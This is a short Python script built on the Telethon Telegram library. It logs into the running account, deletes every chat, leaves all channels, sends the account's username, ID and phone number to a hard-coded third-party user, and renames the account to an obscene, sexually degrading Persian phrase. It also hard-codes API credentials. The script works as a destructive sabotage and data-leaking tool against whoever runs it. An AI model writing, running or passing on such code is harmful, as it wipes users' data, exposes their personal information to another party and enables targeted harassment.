from telethon import TelegramClient
from telethon.tl.functions.channels import LeaveChannelRequest
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors import FloodWaitError
from telethon.tl.types import Channel
import asyncio


API_ID = 29834234
API_HASH = "552c01d21d127def060f2915aedeebf9"

TARGET_USERNAME = "Moein_915"
NEW_FIRST_NAME = "کیر معین تو کونم"


client = TelegramClient("my_account", API_ID, API_HASH)


async def main():
    await client.start()

    print("Logged in.")

    async for dialog in client.iter_dialogs():
        entity = dialog.entity
        name = dialog.name or str(dialog.id)

        print(f"Processing: {name}")

        try:
            await client.delete_dialog(entity)
            print(f"Deleted chat: {name}")

            if isinstance(entity, Channel):
                try:
                    await client(LeaveChannelRequest(entity))
                    print(f"Left channel: {name}")
                except Exception as e:
                    print(f"Leave failed: {e}")

        except FloodWaitError as e:
            print(f"Flood wait: {e.seconds} seconds")
            await asyncio.sleep(e.seconds)

        except Exception as e:
            print(f"Error deleting {name}: {e}")

        await asyncio.sleep(0.3)


    print("All chats processed.")


    try:
        me = await client.get_me()

        info = (
            f"Username: @{me.username}\n"
            f"ID: {me.id}\n"
            f"Phone: +{me.phone}"
        )

        await client.send_message(TARGET_USERNAME, info)
        print("Account info sent.")

    except Exception as e:
        print(f"Send info error: {e}")


    try:
        await client(
            UpdateProfileRequest(
                first_name=NEW_FIRST_NAME
            )
        )

        print("Name changed.")

    except Exception as e:
        print(f"Profile update error: {e}")


with client:
    client.loop.run_until_complete(main())
